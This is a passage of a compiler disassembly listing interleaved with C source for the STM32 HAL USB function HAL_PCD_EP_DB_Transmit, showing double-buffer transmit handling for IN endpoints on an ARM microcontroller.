 8003088:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 800308c:	b29a      	uxth	r2, r3
 800308e:	69bb      	ldr	r3, [r7, #24]
 8003090:	801a      	strh	r2, [r3, #0]
 8003092:	e017      	b.n	80030c4 <HAL_PCD_EP_DB_Transmit+0x186>
 8003094:	68bb      	ldr	r3, [r7, #8]
 8003096:	785b      	ldrb	r3, [r3, #1]
 8003098:	2b01      	cmp	r3, #1
 800309a:	d113      	bne.n	80030c4 <HAL_PCD_EP_DB_Transmit+0x186>
 800309c:	68fb      	ldr	r3, [r7, #12]
 800309e:	681b      	ldr	r3, [r3, #0]
 80030a0:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80030a4:	b29b      	uxth	r3, r3
 80030a6:	461a      	mov	r2, r3
 80030a8:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 80030aa:	4413      	add	r3, r2
 80030ac:	627b      	str	r3, [r7, #36]	; 0x24
 80030ae:	68bb      	ldr	r3, [r7, #8]
 80030b0:	781b      	ldrb	r3, [r3, #0]
 80030b2:	00da      	lsls	r2, r3, #3
 80030b4:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 80030b6:	4413      	add	r3, r2
 80030b8:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80030bc:	623b      	str	r3, [r7, #32]
 80030be:	6a3b      	ldr	r3, [r7, #32]
 80030c0:	2200      	movs	r2, #0
 80030c2:	801a      	strh	r2, [r3, #0]

      /* TX COMPLETE */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
      hpcd->DataInStageCallback(hpcd, ep->num);
#else
      HAL_PCD_DataInStageCallback(hpcd, ep->num);
 80030c4:	68bb      	ldr	r3, [r7, #8]
 80030c6:	781b      	ldrb	r3, [r3, #0]
 80030c8:	4619      	mov	r1, r3
 80030ca:	68f8      	ldr	r0, [r7, #12]
 80030cc:	f009 fc49 	bl	800c962 <HAL_PCD_DataInStageCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

      if ((wEPVal & USB_EP_DTOG_RX) != 0U)
 80030d0:	88fb      	ldrh	r3, [r7, #6]
 80030d2:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 80030d6:	2b00      	cmp	r3, #0
 80030d8:	f000 82fa 	beq.w	80036d0 <HAL_PCD_EP_DB_Transmit+0x792>
      {
        PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 1U);
 80030dc:	68fb      	ldr	r3, [r7, #12]
 80030de:	681b      	ldr	r3, [r3, #0]
 80030e0:	461a      	mov	r2, r3
 80030e2:	68bb      	ldr	r3, [r7, #8]
 80030e4:	781b      	ldrb	r3, [r3, #0]
 80030e6:	009b      	lsls	r3, r3, #2
 80030e8:	4413      	add	r3, r2
 80030ea:	881b      	ldrh	r3, [r3, #0]
 80030ec:	b29b      	uxth	r3, r3
 80030ee:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80030f2:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80030f6:	82fb      	strh	r3, [r7, #22]
 80030f8:	68fb      	ldr	r3, [r7, #12]
 80030fa:	681b      	ldr	r3, [r3, #0]
 80030fc:	461a      	mov	r2, r3
 80030fe:	68bb      	ldr	r3, [r7, #8]
 8003100:	781b      	ldrb	r3, [r3, #0]
 8003102:	009b      	lsls	r3, r3, #2
 8003104:	441a      	add	r2, r3
 8003106:	8afb      	ldrh	r3, [r7, #22]
 8003108:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800310c:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8003110:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 8003114:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8003118:	b29b      	uxth	r3, r3
 800311a:	8013      	strh	r3, [r2, #0]
 800311c:	e2d8      	b.n	80036d0 <HAL_PCD_EP_DB_Transmit+0x792>
      }
    }
    else /* Transfer is not yet Done */
    {
      /* need to Free USB Buff */
      if ((wEPVal & USB_EP_DTOG_RX) != 0U)
 800311e:	88fb      	ldrh	r3, [r7, #6]
 8003120:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8003124:	2b00      	cmp	r3, #0
 8003126:	d021      	beq.n	800316c <HAL_PCD_EP_DB_Transmit+0x22e>
      {
        PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 1U);
 8003128:	68fb      	ldr	r3, [r7, #12]
 800312a:	681b      	ldr	r3, [r3, #0]
 800312c:	461a      	mov	r2, r3
 800312e:	68bb      	ldr	r3, [r7, #8]
 8003130:	781b      	ldrb	r3, [r3, #0]
 8003132:	009b      	lsls	r3, r3, #2
 8003134:	4413      	add	r3, r2
 8003136:	881b      	ldrh	r3, [r3, #0]
 8003138:	b29b      	uxth	r3, r3
 800313a:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800313e:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8003142:	f8a7 308a 	strh.w	r3, [r7, #138]	; 0x8a
 8003146:	68fb      	ldr	r3, [r7, #12]
 8003148:	681b      	ldr	r3, [r3, #0]
 800314a:	461a      	mov	r2, r3
 800314c:	68bb      	ldr	r3, [r7, #8]
 800314e:	781b      	ldrb	r3, [r3, #0]
 8003150:	009b      	lsls	r3, r3, #2
 8003152:	441a      	add	r2, r3
 8003154:	f8b7 308a 	ldrh.w	r3, [r7, #138]	; 0x8a
 8003158:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800315c:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8003160:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 8003164:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8003168:	b29b      	uxth	r3, r3
 800316a:	8013      	strh	r3, [r2, #0]
      }

      /* Still there is data to Fill in the next Buffer */
      if (ep->xfer_fill_db == 1U)
 800316c:	68bb      	ldr	r3, [r7, #8]
 800316e:	f893 3024 	ldrb.w	r3, [r3, #36]	; 0x24
 8003172:	2b01      	cmp	r3, #1
 8003174:	f040 82ac 	bne.w	80036d0 <HAL_PCD_EP_DB_Transmit+0x792>
      {
        ep->xfer_buff += TxPctSize;
 8003178:	68bb      	ldr	r3, [r7, #8]
 800317a:	695a      	ldr	r2, [r3, #20]
 800317c:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 8003180:	441a      	add	r2, r3
 8003182:	68bb      	ldr	r3, [r7, #8]
 8003184:	615a      	str	r2, [r3, #20]
        ep->xfer_count += TxPctSize;
 8003186:	68bb      	ldr	r3, [r7, #8]
 8003188:	69da      	ldr	r2, [r3, #28]
 800318a:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 800318e:	441a      	add	r2, r3
 8003190:	68bb      	ldr	r3, [r7, #8]
 8003192:	61da      	str	r2, [r3, #28]

        /* Calculate the len of the new buffer to fill */
        if (ep->xfer_len_db >= ep->maxpacket)
 8003194:	68bb      	ldr	r3, [r7, #8]
 8003196:	6a1a      	ldr	r2, [r3, #32]
 8003198:	68bb      	ldr	r3, [r7, #8]
 800319a:	691b      	ldr	r3, [r3, #16]
 800319c:	429a      	cmp	r2, r3
 800319e:	d30b      	bcc.n	80031b8 <HAL_PCD_EP_DB_Transmit+0x27a>
        {
          len = ep->maxpacket;
 80031a0:	68bb      	ldr	r3, [r7, #8]
 80031a2:	691b      	ldr	r3, [r3, #16]
 80031a4:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
          ep->xfer_len_db -= len;
 80031a8:	68bb      	ldr	r3, [r7, #8]
 80031aa:	6a1a      	ldr	r2, [r3, #32]
 80031ac:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80031b0:	1ad2      	subs	r2, r2, r3
 80031b2:	68bb      	ldr	r3, [r7, #8]
 80031b4:	621a      	str	r2, [r3, #32]
 80031b6:	e017      	b.n	80031e8 <HAL_PCD_EP_DB_Transmit+0x2aa>
        }
        else if (ep->xfer_len_db == 0U)
 80031b8:	68bb      	ldr	r3, [r7, #8]
 80031ba:	6a1b      	ldr	r3, [r3, #32]
 80031bc:	2b00      	cmp	r3, #0
 80031be:	d108      	bne.n	80031d2 <HAL_PCD_EP_DB_Transmit+0x294>
        {
          len = TxPctSize;
 80031c0:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 80031c4:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
          ep->xfer_fill_db = 0U;
 80031c8:	68bb      	ldr	r3, [r7, #8]
 80031ca:	2200      	movs	r2, #0
 80031cc:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
 80031d0:	e00a      	b.n	80031e8 <HAL_PCD_EP_DB_Transmit+0x2aa>
        }
        else
        {
          ep->xfer_fill_db = 0U;
 80031d2:	68bb      	ldr	r3, [r7, #8]
 80031d4:	2200      	movs	r2, #0
 80031d6:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
          len = ep->xfer_len_db;
 80031da:	68bb      	ldr	r3, [r7, #8]
 80031dc:	6a1b      	ldr	r3, [r3, #32]
 80031de:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
          ep->xfer_len_db = 0U;
 80031e2:	68bb      	ldr	r3, [r7, #8]
 80031e4:	2200      	movs	r2, #0
 80031e6:	621a      	str	r2, [r3, #32]
        }

        /* Write remaining Data to Buffer */
        /* Set the Double buffer counter for pma buffer1 */
        PCD_SET_EP_DBUF0_CNT(hpcd->Instance, ep->num, ep->is_in, len);
 80031e8:	68bb      	ldr	r3, [r7, #8]
 80031ea:	785b      	ldrb	r3, [r3, #1]
 80031ec:	2b00      	cmp	r3, #0
 80031ee:	d165      	bne.n	80032bc <HAL_PCD_EP_DB_Transmit+0x37e>
 80031f0:	68fb      	ldr	r3, [r7, #12]
 80031f2:	681b      	ldr	r3, [r3, #0]
 80031f4:	63fb      	str	r3, [r7, #60]	; 0x3c
 80031f6:	68fb      	ldr	r3, [r7, #12]
 80031f8:	681b      	ldr	r3, [r3, #0]
 80031fa:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80031fe:	b29b      	uxth	r3, r3
 8003200:	461a      	mov	r2, r3
 8003202:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8003204:	4413      	add	r3, r2
 8003206:	63fb      	str	r3, [r7, #60]	; 0x3c
 8003208:	68bb      	ldr	r3, [r7, #8]
 800320a:	781b      	ldrb	r3, [r3, #0]
 800320c:	00da      	lsls	r2, r3, #3
 800320e:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8003210:	4413      	add	r3, r2
 8003212:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8003216:	63bb      	str	r3, [r7, #56]	; 0x38
 8003218:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 800321a:	881b      	ldrh	r3, [r3, #0]
 800321c:	b29b      	uxth	r3, r3
 800321e:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8003222:	b29a      	uxth	r2, r3
 8003224:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8003226:	801a      	strh	r2, [r3, #0]
 8003228:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 800322c:	2b3e      	cmp	r3, #62	; 0x3e
 800322e:	d91d      	bls.n	800326c <HAL_PCD_EP_DB_Transmit+0x32e>
 8003230:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003234:	095b      	lsrs	r3, r3, #5
 8003236:	64bb      	str	r3, [r7, #72]	; 0x48
 8003238:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 800323c:	f003 031f 	and.w	r3, r3, #31
 8003240:	2b00      	cmp	r3, #0
 8003242:	d102      	bne.n	800324a <HAL_PCD_EP_DB_Transmit+0x30c>
 8003244:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 8003246:	3b01      	subs	r3, #1
 8003248:	64bb      	str	r3, [r7, #72]	; 0x48
 800324a:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 800324c:	881b      	ldrh	r3, [r3, #0]
 800324e:	b29a      	uxth	r2, r3
 8003250:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 8003252:	b29b      	uxth	r3, r3
 8003254:	029b      	lsls	r3, r3, #10
 8003256:	b29b      	uxth	r3, r3
 8003258:	4313      	orrs	r3, r2
 800325a:	b29b      	uxth	r3, r3
 800325c:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8003260:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8003264:	b29a      	uxth	r2, r3
 8003266:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8003268:	801a      	strh	r2, [r3, #0]
 800326a:	e044      	b.n	80032f6 <HAL_PCD_EP_DB_Transmit+0x3b8>
 800326c:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003270:	2b00      	cmp	r3, #0
 8003272:	d10a      	bne.n	800328a <HAL_PCD_EP_DB_Transmit+0x34c>
 8003274:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8003276:	881b      	ldrh	r3, [r3, #0]
 8003278:	b29b      	uxth	r3, r3
 800327a:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800327e:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8003282:	b29a      	uxth	r2, r3
 8003284:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8003286:	801a      	strh	r2, [r3, #0]
 8003288:	e035      	b.n	80032f6 <HAL_PCD_EP_DB_Transmit+0x3b8>
 800328a:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 800328e:	085b      	lsrs	r3, r3, #1
 8003290:	64bb      	str	r3, [r7, #72]	; 0x48
 8003292:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003296:	f003 0301 	and.w	r3, r3, #1
 800329a:	2b00      	cmp	r3, #0
 800329c:	d002      	beq.n	80032a4 <HAL_PCD_EP_DB_Transmit+0x366>
 800329e:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 80032a0:	3301      	adds	r3, #1
 80032a2:	64bb      	str	r3, [r7, #72]	; 0x48
 80032a4:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 80032a6:	881b      	ldrh	r3, [r3, #0]
 80032a8:	b29a      	uxth	r2, r3
 80032aa:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 80032ac:	b29b      	uxth	r3, r3
 80032ae:	029b      	lsls	r3, r3, #10
 80032b0:	b29b      	uxth	r3, r3
 80032b2:	4313      	orrs	r3, r2
 80032b4:	b29a      	uxth	r2, r3
 80032b6:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 80032b8:	801a      	strh	r2, [r3, #0]
 80032ba:	e01c      	b.n	80032f6 <HAL_PCD_EP_DB_Transmit+0x3b8>
 80032bc:	68bb      	ldr	r3, [r7, #8]
 80032be:	785b      	ldrb	r3, [r3, #1]
 80032c0:	2b01      	cmp	r3, #1
 80032c2:	d118      	bne.n	80032f6 <HAL_PCD_EP_DB_Transmit+0x3b8>
 80032c4:	68fb      	ldr	r3, [r7, #12]
 80032c6:	681b      	ldr	r3, [r3, #0]
 80032c8:	647b      	str	r3, [r7, #68]	; 0x44
 80032ca:	68fb      	ldr	r3, [r7, #12]
 80032cc:	681b      	ldr	r3, [r3, #0]
 80032ce:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80032d2:	b29b      	uxth	r3, r3
 80032d4:	461a      	mov	r2, r3
 80032d6:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 80032d8:	4413      	add	r3, r2
 80032da:	647b      	str	r3, [r7, #68]	; 0x44
 80032dc:	68bb      	ldr	r3, [r7, #8]
 80032de:	781b      	ldrb	r3, [r3, #0]
 80032e0:	00da      	lsls	r2, r3, #3
 80032e2:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 80032e4:	4413      	add	r3, r2
 80032e6:	f203 4302 	addw	r3, r3, #1026	; 0x402
 80032ea:	643b      	str	r3, [r7, #64]	; 0x40
 80032ec:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80032f0:	b29a      	uxth	r2, r3
 80032f2:	6c3b      	ldr	r3, [r7, #64]	; 0x40
 80032f4:	801a      	strh	r2, [r3, #0]

        /* Copy user buffer to USB PMA */
        USB_WritePMA(hpcd->Instance, ep->xfer_buff,  ep->pmaaddr0, (uint16_t)len);
 80032f6:	68fb      	ldr	r3, [r7, #12]
 80032f8:	6818      	ldr	r0, [r3, #0]
 80032fa:	68bb      	ldr	r3, [r7, #8]
 80032fc:	6959      	ldr	r1, [r3, #20]
 80032fe:	68bb      	ldr	r3, [r7, #8]
 8003300:	891a      	ldrh	r2, [r3, #8]
 8003302:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003306:	b29b      	uxth	r3, r3
 8003308:	f005 f8c9 	bl	800849e <USB_WritePMA>
 800330c:	e1e0      	b.n	80036d0 <HAL_PCD_EP_DB_Transmit+0x792>
    }
  }
  else /* Data Buffer1 ACK received */
  {
    /* multi-packet on the NON control IN endpoint */
    TxPctSize = (uint16_t)PCD_GET_EP_DBUF1_CNT(hpcd->Instance, ep->num);
 800330e:	68fb      	ldr	r3, [r7, #12]
 8003310:	681b      	ldr	r3, [r3, #0]
 8003312:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8003316:	b29b      	uxth	r3, r3
 8003318:	461a      	mov	r2, r3
 800331a:	68bb      	ldr	r3, [r7, #8]
 800331c:	781b      	ldrb	r3, [r3, #0]
 800331e:	00db      	lsls	r3, r3, #3
 8003320:	4413      	add	r3, r2
 8003322:	68fa      	ldr	r2, [r7, #12]
 8003324:	6812      	ldr	r2, [r2, #0]
 8003326:	4413      	add	r3, r2
 8003328:	f203 4306 	addw	r3, r3, #1030	; 0x406
 800332c:	881b      	ldrh	r3, [r3, #0]
 800332e:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8003332:	f8a7 3086 	strh.w	r3, [r7, #134]	; 0x86

    if (ep->xfer_len >= TxPctSize)
 8003336:	68bb      	ldr	r3, [r7, #8]
 8003338:	699a      	ldr	r2, [r3, #24]
 800333a:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 800333e:	429a      	cmp	r2, r3
 8003340:	d307      	bcc.n	8003352 <HAL_PCD_EP_DB_Transmit+0x414>
    {
      ep->xfer_len -= TxPctSize;
 8003342:	68bb      	ldr	r3, [r7, #8]
 8003344:	699a      	ldr	r2, [r3, #24]
 8003346:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 800334a:	1ad2      	subs	r2, r2, r3
 800334c:	68bb      	ldr	r3, [r7, #8]
 800334e:	619a      	str	r2, [r3, #24]
 8003350:	e002      	b.n	8003358 <HAL_PCD_EP_DB_Transmit+0x41a>
    }
    else
    {
      ep->xfer_len = 0U;
 8003352:	68bb      	ldr	r3, [r7, #8]
 8003354:	2200      	movs	r2, #0
 8003356:	619a      	str	r2, [r3, #24]
    }

    /* Transfer is completed */
    if (ep->xfer_len == 0U)
 8003358:	68bb      	ldr	r3, [r7, #8]
 800335a:	699b      	ldr	r3, [r3, #24]
 800335c:	2b00      	cmp	r3, #0
 800335e:	f040 80c0 	bne.w	80034e2 <HAL_PCD_EP_DB_Transmit+0x5a4>
    {
      PCD_SET_EP_DBUF0_CNT(hpcd->Instance, ep->num, ep->is_in, 0U);
 8003362:	68bb      	ldr	r3, [r7, #8]
 8003364:	785b      	ldrb	r3, [r3, #1]
 8003366:	2b00      	cmp	r3, #0
 8003368:	d126      	bne.n	80033b8 <HAL_PCD_EP_DB_Transmit+0x47a>
 800336a:	68fb      	ldr	r3, [r7, #12]
 800336c:	681b      	ldr	r3, [r3, #0]
 800336e:	67fb      	str	r3, [r7, #124]	; 0x7c
 8003370:	68fb      	ldr	r3, [r7, #12]
 8003372:	681b      	ldr	r3, [r3, #0]
 8003374:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8003378:	b29b      	uxth	r3, r3
 800337a:	461a      	mov	r2, r3
 800337c:	6ffb      	ldr	r3, [r7, #124]	; 0x7c
 800337e:	4413      	add	r3, r2
 8003380:	67fb      	str	r3, [r7, #124]	; 0x7c
 8003382:	68bb      	ldr	r3, [r7, #8]
 8003384:	781b      	ldrb	r3, [r3, #0]
 8003386:	00da      	lsls	r2, r3, #3
 8003388:	6ffb      	ldr	r3, [r7, #124]	; 0x7c
 800338a:	4413      	add	r3, r2
 800338c:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8003390:	67bb      	str	r3, [r7, #120]	; 0x78
 8003392:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 8003394:	881b      	ldrh	r3, [r3, #0]
 8003396:	b29b      	uxth	r3, r3
 8003398:	f3c3 0309 	ubfx	r3, r3, #0, #10
 800339c:	b29a      	uxth	r2, r3
 800339e:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 80033a0:	801a      	strh	r2, [r3, #0]
 80033a2:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 80033a4:	881b      	ldrh	r3, [r3, #0]
 80033a6:	b29b      	uxth	r3, r3
 80033a8:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80033ac:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80033b0:	b29a      	uxth	r2, r3
 80033b2:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 80033b4:	801a      	strh	r2, [r3, #0]
 80033b6:	e01a      	b.n	80033ee <HAL_PCD_EP_DB_Transmit+0x4b0>
 80033b8:	68bb      	ldr	r3, [r7, #8]
 80033ba:	785b      	ldrb	r3, [r3, #1]
 80033bc:	2b01      	cmp	r3, #1
 80033be:	d116      	bne.n	80033ee <HAL_PCD_EP_DB_Transmit+0x4b0>
 80033c0:	68fb      	ldr	r3, [r7, #12]
 80033c2:	681b      	ldr	r3, [r3, #0]
 80033c4:	667b      	str	r3, [r7, #100]	; 0x64
 80033c6:	68fb      	ldr	r3, [r7, #12]
 80033c8:	681b      	ldr	r3, [r3, #0]
 80033ca:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80033ce:	b29b      	uxth	r3, r3
 80033d0:	461a      	mov	r2, r3
 80033d2:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 80033d4:	4413      	add	r3, r2
 80033d6:	667b      	str	r3, [r7, #100]	; 0x64
 80033d8:	68bb      	ldr	r3, [r7, #8]
 80033da:	781b      	ldrb	r3, [r3, #0]
 80033dc:	00da      	lsls	r2, r3, #3
 80033de:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 80033e0:	4413      	add	r3, r2
 80033e2:	f203 4302 	addw	r3, r3, #1026	; 0x402
 80033e6:	663b      	str	r3, [r7, #96]	; 0x60
 80033e8:	6e3b      	ldr	r3, [r7, #96]	; 0x60
 80033ea:	2200      	movs	r2, #0
 80033ec:	801a      	strh	r2, [r3, #0]
      PCD_SET_EP_DBUF1_CNT(hpcd->Instance, ep->num, ep->is_in, 0U);
 80033ee:	68fb      	ldr	r3, [r7, #12]
 80033f0:	681b      	ldr	r3, [r3, #0]
 80033f2:	677b      	str	r3, [r7, #116]	; 0x74
 80033f4:	68bb      	ldr	r3, [r7, #8]
 80033f6:	785b      	ldrb	r3, [r3, #1]
 80033f8:	2b00      	cmp	r3, #0
 80033fa:	d12b      	bne.n	8003454 <HAL_PCD_EP_DB_Transmit+0x516>
 80033fc:	68fb      	ldr	r3, [r7, #12]
 80033fe:	681b      	ldr	r3, [r3, #0]
 8003400:	66fb      	str	r3, [r7, #108]	; 0x6c
 8003402:	68fb      	ldr	r3, [r7, #12]
 8003404:	681b      	ldr	r3, [r3, #0]
 8003406:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800340a:	b29b      	uxth	r3, r3
 800340c:	461a      	mov	r2, r3
 800340e:	6efb      	ldr	r3, [r7, #108]	; 0x6c
 8003410:	4413      	add	r3, r2
 8003412:	66fb      	str	r3, [r7, #108]	; 0x6c
 8003414:	68bb      	ldr	r3, [r7, #8]
 8003416:	781b      	ldrb	r3, [r3, #0]
 8003418:	00da      	lsls	r2, r3, #3
 800341a:	6efb      	ldr	r3, [r7, #108]	; 0x6c
 800341c:	4413      	add	r3, r2
 800341e:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8003422:	f8c7 3080 	str.w	r3, [r7, #128]	; 0x80
 8003426:	f8d7 3080 	ldr.w	r3, [r7, #128]	; 0x80
 800342a:	881b      	ldrh	r3, [r3, #0]
 800342c:	b29b      	uxth	r3, r3
 800342e:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8003432:	b29a      	uxth	r2, r3
 8003434:	f8d7 3080 	ldr.w	r3, [r7, #128]	; 0x80
 8003438:	801a      	strh	r2, [r3, #0]
 800343a:	f8d7 3080 	ldr.w	r3, [r7, #128]	; 0x80
 800343e:	881b      	ldrh	r3, [r3, #0]
 8003440:	b29b      	uxth	r3, r3
 8003442:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8003446:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 800344a:	b29a      	uxth	r2, r3
 800344c:	f8d7 3080 	ldr.w	r3, [r7, #128]	; 0x80
 8003450:	801a      	strh	r2, [r3, #0]
 8003452:	e017      	b.n	8003484 <HAL_PCD_EP_DB_Transmit+0x546>
 8003454:	68bb      	ldr	r3, [r7, #8]
 8003456:	785b      	ldrb	r3, [r3, #1]
 8003458:	2b01      	cmp	r3, #1
 800345a:	d113      	bne.n	8003484 <HAL_PCD_EP_DB_Transmit+0x546>
 800345c:	68fb      	ldr	r3, [r7, #12]
 800345e:	681b      	ldr	r3, [r3, #0]
 8003460:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8003464:	b29b      	uxth	r3, r3
 8003466:	461a      	mov	r2, r3
 8003468:	6f7b      	ldr	r3, [r7, #116]	; 0x74
 800346a:	4413      	add	r3, r2
 800346c:	677b      	str	r3, [r7, #116]	; 0x74
 800346e:	68bb      	ldr	r3, [r7, #8]
 8003470:	781b      	ldrb	r3, [r3, #0]
 8003472:	00da      	lsls	r2, r3, #3
 8003474:	6f7b      	ldr	r3, [r7, #116]	; 0x74
 8003476:	4413      	add	r3, r2
 8003478:	f203 4306 	addw	r3, r3, #1030	; 0x406
 800347c:	673b      	str	r3, [r7, #112]	; 0x70
 800347e:	6f3b      	ldr	r3, [r7, #112]	; 0x70
 8003480:	2200      	movs	r2, #0
 8003482:	801a      	strh	r2, [r3, #0]

      /* TX COMPLETE */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
      hpcd->DataInStageCallback(hpcd, ep->num);
#else
      HAL_PCD_DataInStageCallback(hpcd, ep->num);
 8003484:	68bb      	ldr	r3, [r7, #8]
 8003486:	781b      	ldrb	r3, [r3, #0]
 8003488:	4619      	mov	r1, r3
 800348a:	68f8      	ldr	r0, [r7, #12]
 800348c:	f009 fa69 	bl	800c962 <HAL_PCD_DataInStageCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

      /* need to Free USB Buff */
      if ((wEPVal & USB_EP_DTOG_RX) == 0U)
 8003490:	88fb      	ldrh	r3, [r7, #6]
 8003492:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8003496:	2b00      	cmp	r3, #0
 8003498:	f040 811a 	bne.w	80036d0 <HAL_PCD_EP_DB_Transmit+0x792>
      {
        PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 1U);
 800349c:	68fb      	ldr	r3, [r7, #12]
 800349e:	681b      	ldr	r3, [r3, #0]
 80034a0:	461a      	mov	r2, r3
 80034a2:	68bb      	ldr	r3, [r7, #8]
 80034a4:	781b      	ldrb	r3, [r3, #0]
 80034a6:	009b      	lsls	r3, r3, #2
 80034a8:	4413      	add	r3, r2
 80034aa:	881b      	ldrh	r3, [r3, #0]
 80034ac:	b29b      	uxth	r3, r3
 80034ae:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80034b2:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80034b6:	f8a7 3088 	strh.w	r3, [r7, #136]	; 0x88
 80034ba:	68fb      	ldr	r3, [r7, #12]
 80034bc:	681b      	ldr	r3, [r3, #0]
 80034be:	461a      	mov	r2, r3
 80034c0:	68bb      	ldr	r3, [r7, #8]
 80034c2:	781b      	ldrb	r3, [r3, #0]
 80034c4:	009b      	lsls	r3, r3, #2
 80034c6:	441a      	add	r2, r3
 80034c8:	f8b7 3088 	ldrh.w	r3, [r7, #136]	; 0x88
 80034cc:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80034d0:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80034d4:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 80034d8:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80034dc:	b29b      	uxth	r3, r3
 80034de:	8013      	strh	r3, [r2, #0]
 80034e0:	e0f6      	b.n	80036d0 <HAL_PCD_EP_DB_Transmit+0x792>
      }
    }
    else /* Transfer is not yet Done */
    {
      /* need to Free USB Buff */
      if ((wEPVal & USB_EP_DTOG_RX) == 0U)
 80034e2:	88fb      	ldrh	r3, [r7, #6]
 80034e4:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 80034e8:	2b00      	cmp	r3, #0
 80034ea:	d121      	bne.n	8003530 <HAL_PCD_EP_DB_Transmit+0x5f2>
      {
        PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 1U);
 80034ec:	68fb      	ldr	r3, [r7, #12]
 80034ee:	681b      	ldr	r3, [r3, #0]
 80034f0:	461a      	mov	r2, r3
 80034f2:	68bb      	ldr	r3, [r7, #8]
 80034f4:	781b      	ldrb	r3, [r3, #0]
 80034f6:	009b      	lsls	r3, r3, #2
 80034f8:	4413      	add	r3, r2
